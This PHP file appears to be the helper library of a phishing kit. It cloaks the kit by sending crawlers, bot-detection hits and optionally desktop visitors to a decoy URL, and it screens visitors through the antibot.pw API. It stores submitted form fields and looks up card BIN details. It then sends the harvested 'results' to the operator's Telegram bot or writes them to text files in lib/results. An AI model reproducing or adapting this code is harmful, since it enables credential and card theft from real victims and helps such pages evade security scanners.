<?php
use Jaybizzle\CrawlerDetect\CrawlerDetect;

function allow_only_mobile() {
  include 'mobile-detect/mobile-detect.php';

  $detector = new Mobile_Detect;

  if (!$detector->isMobile()) { header("Location: https://scampage.net/"); session_destroy(); }
}

function external_antibot_detection() {
  if (ANTIBOT_APIKEY == '') { return; }

  $user_agent = $_SERVER["HTTP_USER_AGENT"];
  $ip = $_SERVER["REMOTE_ADDR"] == '::1' ? '82.41.94.21' : $_SERVER["REMOTE_ADDR"];
  $apikey = ANTIBOT_APIKEY;
  $url = "https://antibot.pw/api/v2-blockers?ip=$ip&apikey=$apikey&ua=$user_agent";

  $request = curl_init($url);

  curl_setopt($request, CURLOPT_RETURNTRANSFER,1);
  curl_setopt($request, CURLOPT_HEADER, 0);

  $response = curl_exec($request);

  if(curl_error($request)) {
    echo 'Antibot.pw error, please retry.';
    die(0);
  }

  $parsed_resposne = json_decode($response, true);

  if ($parsed_resposne["status"] != true) {
    echo 'Antibot.pw error, please retry.';
    die(0);
  }

  $is_bot = $parsed_resposne["is_bot"];

  return $is_bot;
}

function page_initialise() {
  include 'settings/config.php';
  include 'lib/antibot/Fixtures/AbstractProvider.php';
  include 'lib/antibot/Fixtures/Exclusions.php';
  include 'lib/antibot/Fixtures/Headers.php';
  include 'lib/antibot/Fixtures/Crawlers.php';
  include 'lib/antibot/CrawlerDetect.php';

  $CrawlerDetect = new CrawlerDetect;

  if ($CrawlerDetect->isCrawler() || external_antibot_detection()) { header("Location: https://scampage.net/"); session_destroy(); }

  if (IS_MOBILE_ONLY == '1') {
    allow_only_mobile();
  }

  if (session_status() != PHP_SESSION_ACTIVE) {
    session_start();
  }
}

function random_string() {
  $_ = "abcdefghijklmnopqrstuvwxazABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  $return_str = "";

  for ($i = 0; $i < 45; $i++) {
    $return_str .= $_[rand(0, strlen($_) - 1)];
  }

  return $return_str;
}

function url_params() {
  $random_string = random_string();
  $url_params = "cookies=none;browsing-time=1233435;auth-id=$random_string";

  return $url_params;
}

function store_post_values($data) {
  foreach ($data as $key => $value) {
    $_SESSION[$key] = $value;
  }
}

function optional_input($input) {
  return isset($_SESSION[$input]) ? $input : 'Not Given';
}

function page_redirect($location) {
  $url_params = url_params();

  header("Location: $location?$url_params");
}

function construct_url($location) {
  $url_params = url_params();

  echo "$location?$url_params";
}

function get_bin_details($bin) {
  $req_url = "https://lookup.binlist.net/$bin";

  $json = json_decode(file_get_contents($req_url), true);

  $scheme = $json["scheme"];
  $bank = $json["bank"]["name"];

  return array('scheme' => $scheme, 'bank' => $bank);
}

function telegram_result($txt) {
	if (TELEGRAM_RESULT != '1') { return; }

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot" . TELEGRAM_BOT_ID . "/sendMessage");
	curl_setopt($ch, CURLOPT_POST, 1);

	$values = array(
		'chat_id' => TELEGRAM_CHAT_ID,
		'text' => $txt
	);

	$params = http_build_query($values);

	curl_setopt($ch, CURLOPT_POSTFIELDS,$params);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	$server_output = curl_exec ($ch);

	curl_close ($ch);
}

function save_as_text($txt) {
  $random_string = rand(111111, 999999);
  $path = "./lib/results/$random_string.txt";
  file_put_contents($path, $txt);
}
 ?>
